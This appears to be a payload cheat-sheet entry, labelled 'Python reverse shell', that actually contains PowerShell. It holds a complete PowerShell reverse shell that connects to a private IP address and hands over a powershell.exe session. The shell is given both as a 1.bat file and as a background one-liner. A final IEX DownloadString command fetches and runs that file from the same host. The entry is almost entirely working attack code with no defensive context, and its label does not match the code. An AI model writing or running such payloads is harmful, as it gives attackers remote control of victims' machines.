---
functions:
  shell:
    - description: Python reverse shell
      code: |

        (1a) Host 1.bat

        1.bat:
        $a='192.168.49.71';$b=9999;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='powershell.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}

        (1b) Execute from cmdline

        start /B powershell -c "$a='192.168.49.71';$b=80;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='powershell.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}"

        (1b) --> (2) 
        powershell -c IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.49.71/1.bat'))

        
        


        

---
